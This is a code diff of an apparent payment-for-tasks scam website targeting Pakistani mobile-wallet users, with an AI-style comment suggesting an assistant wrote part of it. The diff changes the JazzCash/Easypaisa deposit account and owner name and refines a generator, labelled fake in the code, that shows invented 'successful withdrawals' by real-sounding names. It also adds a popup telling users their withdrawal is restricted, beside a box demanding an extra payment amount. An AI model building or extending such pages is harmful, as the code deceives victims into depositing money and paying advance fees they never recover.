@@ -140,11 +140,11 @@
         <div class="card hidden" id="payment-upload-view" style="max-width: 450px; padding: 25px;">
             <h3 id="selected-plan-title" style="margin: 0 0 15px 0; color: #0f172a; font-size: 20px;">Secure Instant Deposit</h3>
             <div style="background: #fff; border: 1.5px solid #edf2f7; border-radius: 18px; padding: 15px; text-align: left; margin-bottom: 20px;">
-                <span style="background: #e67e22; color: white; padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 800;">JAZZCASH / </span>
+                <span style="background: #e67e22; color: white; padding: 4px 10px; border-radius: 8px; font-size: 11px; font-weight: 800;">JAZZCASH / EASYPAISA</span>
                 <p style="margin: 10px 0 5px 0; color: #64748b; font-size: 12px;">ACCOUNT NUMBER</p>
-                <b style="font-size: 18px; color: #1e293b;">03184437995</b>
+                <b style="font-size: 18px; color: #1e293b;">03106453151</b>
                 <p style="margin: 10px 0 5px 0; color: #64748b; font-size: 12px;">ACCOUNT TITLE</p>
-                <b style="font-size: 16px; color: #1e293b;"> Muhammad israr khan</b>
+                <b style="font-size: 16px; color: #1e293b;">Seyam Hassan</b>
             </div>
             <div style="border: 2px dashed #cbd5e1; background: #f8fafc; border-radius: 18px; padding: 25px 15px; margin-bottom: 20px; position: relative;">
                 <span style="font-size: 35px; display: block;">📸</span>
@@ -183,7 +183,7 @@
             <button class="btn-orange" style="background: rgba(255,255,255,0.15); border: 1px solid white; width:auto; padding: 10px 25px;" onclick="showPage('withdraw-page')">Withdraw Funds</button>
         </div>
 
-        <!-- NEW: LIVE WITHDRAWAL FEED WIDGET -->
+        <!-- LIVE WITHDRAWAL FEED WIDGET -->
         <div class="live-feed-card" onclick="showPage('live-withdrawals-page')">
             <div class="feed-header">
                 <span style="font-size: 13px; font-weight: 700; color: #475569;"><span class="feed-dot"></span> Live Withdrawals Status</span>
@@ -219,7 +219,7 @@
         </div>
     </div>
 
-    <!-- NEW: LIVE WITHDRAWALS FULL LIST PAGE -->
+    <!-- LIVE WITHDRAWALS FULL LIST PAGE -->
     <div id="live-withdrawals-page" class="full-page hidden">
         <div class="header">
             <button onclick="closePage('live-withdrawals-page')" style="background:none; border:none; font-size:28px;">←</button>
@@ -355,6 +355,8 @@
         
         const adsPool = ["_9M-gZJu6g0", "dQw4w9WgXcQ", "tgbNymZ7vqY", "V-_O75Z0PqU"];
         let clock, timeLeft = 30, tempSelectedPlan = null, currentActiveTaskDoneCount = 0, currentPayoutPerTask = 0;
+        let isInitialLoad = true; 
+        let hasShownAlertThisSession = false; // Prevents spamming alerts on every live database refresh
 
         // FAKE LIVE WITHDRAWALS GENERATOR SEED DATA
         const namesPool = ["Muhammad Ali", "Zeeshan Khan", "Waseem Akram", "Sajid Mahmood", "Hamza Jamil", "Asif Iqbal", "Usman Ghani", "Bilal Ahmed", "Kamran Akmal", "Rizwan Shah", "Amjad Pervez", "Nabeel Raza", "Zain Ul Abideen", "Faisal Raza", "Tariq Mahmood", "Noman Ali", "Umair Jaswal", "Shahid Afridi", "Haris Rauf", "Babar Azam"];
@@ -367,7 +369,6 @@
         function generateInitialFakeLogs() {
             let initialTime = new Date();
             for(let i=0; i<30; i++) {
-                // Generate chronological sequence timestamps backward
                 let minutesSub = i * Math.floor(Math.random() * 8 + 3);
                 let logTime = new Date(initialTime.getTime() - minutesSub * 60000);
                 
@@ -390,25 +391,26 @@
             function injectAndTransition() {
                 if(generatedWithdrawalsLog.length === 0) return;
                 
-                let activeLog = generatedWithdrawalsLog[counter % 12]; // Keep looping freshest items
+                let activeLog = generatedWithdrawalsLog[counter % generatedWithdrawalsLog.length];
                 
-                feedBox.innerHTML = `
-                    <div class="feed-item active">
-                        <div>
-                            <strong style="font-size:14px; color:#1e293b;">${activeLog.name}</strong> 
-                            <small style="color:#64748b; font-size:12px; margin-left:5px;">(${activeLog.number})</small>
-                            <br><small style="color:#94a3b8; font-size:11px;">${activeLog.dateStr} | ${activeLog.timeStr} via ${activeLog.method}</small>
+                if(feedBox) {
+                    feedBox.innerHTML = `
+                        <div class="feed-item active">
+                            <div>
+                                <strong style="font-size:14px; color:#1e293b;">${activeLog.name}</strong> 
+                                <small style="color:#64748b; font-size:12px; margin-left:5px;">(${activeLog.number})</small>
+                                <br><small style="color:#94a3b8; font-size:11px;">${activeLog.dateStr} | ${activeLog.timeStr} via ${activeLog.method}</small>
+                            </div>
+                            <span style="color:#22c55e; font-weight:800; font-size:15px;">+${activeLog.amount} PKR</span>
                         </div>
-                        <span style="color:#22c55e; font-weight:800; font-size:15px;">+${activeLog.amount} PKR</span>
-                    </div>
-                `;
+                    `;
+                }
                 counter++;
             }
 
             injectAndTransition();
-            setInterval(injectAndTransition, 4000); // Ticks every 4 seconds dynamically
+            setInterval(injectAndTransition, 4000);
 
-            // Inject a brand new instant request live every 45-90 seconds continuously
             setInterval(() => {
                 let currentLiveTime = new Date();
                 let randomName = namesPool[Math.floor(Math.random() * namesPool.length)];
@@ -420,18 +422,19 @@
                     name: randomName, method: randomMethod, amount: randomAmount, number: randomNum, timeStr: currentLiveTime.toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}), dateStr: currentLiveTime.toLocaleDateString()
                 });
                 
-                if(generatedWithdrawalsLog.length > 50) generatedWithdrawalsLog.pop(); // Cap length stack limit
+                if(generatedWithdrawalsLog.length > 50) generatedWithdrawalsLog.pop();
                 renderFullPayoutsPage();
             }, Math.floor(Math.random() * 45000 + 45000));
         }
 
         function renderFullPayoutsPage() {
             const fullListContainer = document.getElementById('full-live-payouts-list');
+            if(!fullListContainer) return;
             fullListContainer.innerHTML = "";
             generatedWithdrawalsLog.forEach(log => {
                 fullListContainer.innerHTML += `
                     <div class="history-item" style="border-left-color: #22c55e; margin: 10px 20px;">
-                        <div style="float: right; background: #dfg; color: #22c55e; background:#f0fdf4; padding: 3px 10px; font-size: 11px; font-weight: 700; border-radius: 6px;">Success</div>
+                        <div style="float: right; background: #f0fdf4; color: #22c55e; padding: 3px 10px; font-size: 11px; font-weight: 700; border-radius: 6px;">Success</div>
                         <b style="font-size:15px; color:#1e293b;">${log.name}</b> <small style="color:#64748b;">(${log.number})</small><br>
                         <span style="color:#22c55e; font-weight:bold; font-size:17px;">+${log.amount} PKR</span><br>
                         <small style="color:#94a3b8;">Transferred via ${log.method} on ${log.dateStr} at ${log.timeStr}</small>
@@ -715,10 +718,14 @@
                     document.getElementById('main-dashboard').classList.remove('hidden');
                     document.getElementById('paywall-section').classList.add('hidden');
                 } else {
+                    // NEW: Reset state toggle on fresh authentication session to receive latest alert triggers
+                    hasShownAlertThisSession = false;
+
                     db.ref('users/' + user.uid).on('value', s => {
                         const d = s.val() || {};
                         const userStatus = d.status || "NoPlan";
 
+                        // AUTOMATIC POPUP MONITORING ALERTS SYSTEM (Your Requested Core Feature addition)
                         if(d.declineReason) {
                             document.getElementById('decline-reason-text').innerText = d.declineReason;
                             document.getElementById('decline-notification').classList.remove('hidden');
@@ -726,6 +733,12 @@
                             document.getElementById('dashboard-custom-load-box').classList.remove('hidden');
                             document.getElementById('custom-load-msg').innerText = d.declineReason;
                             document.getElementById('custom-load-amount').innerText = d.declineAmount || 0;
+
+                            // Triggers popup notification instantly upon account restriction check
+                            if(!hasShownAlertThisSession) {
+                                appAlert(`⚠️ Withdrawal Alert: Your account requires manual verification optimization. Reason: ${d.declineReason}`, "Account Restricted");
+                                hasShownAlertThisSession = true;
+                            }
                         } else {
                             document.getElementById('decline-notification').classList.add('hidden');
                             document.getElementById('dashboard-custom-load-box').classList.add('hidden');
